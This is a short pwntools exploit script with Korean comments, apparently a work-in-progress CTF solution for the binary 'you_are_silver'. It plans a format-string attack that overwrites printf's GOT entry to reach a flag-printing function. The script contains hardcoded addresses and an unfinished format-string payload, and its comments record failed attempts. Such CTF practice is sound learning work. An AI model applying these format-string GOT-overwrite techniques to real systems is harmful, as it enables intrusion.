#! -*- coding: utf-8 -*-
from pwn import *

# 프로그램을 시작하면 문자열을 입력받고, 입력한 내용을 출력한다. 
# 일단 fsb 발생 , 64비트 라이브러리다. PIE 안걸려있는 상태. 
# 루틴상 존재하는 함수는 get_tier , play_game 인데 play_game은 호출되지 않는다.
# 근데 종료될때 왜 세그먼트 오류가 뜨지
# main+93 에서 fsb 발생 .
# main+103 에서 get_tier 함수 호출하는데, rbp-0x4 의 값을 인자로 가져온다. 
# 입력위치 0x7fffffffe360 , 해당 위치까지 44바이트 . 
# 해당 함수가 실행 될 때, 인자로 들어간 값 0x4C이상이면 4를 리턴한다. 
# 그 다음 printf 함수가 호출되는데, 이때 인자값으로 저 4를 가지고 들어가서
# 세그먼트 오류가 나는거였다. 저놈을 다른 함수로 바꿔주자.
# 이때 play_game 함수가 인자값 4인 상태로 호출되면 system("cat ./flag")
# 가 실행된다. fsb로 printf got-overwrite를 진행하자. 
# 서식문자가 6번 사용되면 스택 위치를 출력한다. 

p = process("./you_are_silver")

printf_got = 0x601028
fgets_got = 0x601030
play_game = 0x04006d7

payload = "%08lx%08lx%08lx%08lx"
payload += p64(printf_got)
payload += "bbbb"
#payload += 	#스택 시작으로부터 6번쨰 위치에 서식문자 적용.
# 근데 왜 덮어 씌우는게 안되지??
# 원인을 알았다. p32 , p64로 패킹하고 넣어주면 뒷부분 출력이 짤린다..
# 아, 주소값을 스택의 두번째 , 세번째위치에 넣어줘도 되나? 된다.
# 스택의 두번째 위치에는 0이 들어있었기 때문에, 
pause()
p.sendline(payload)
p.interactive()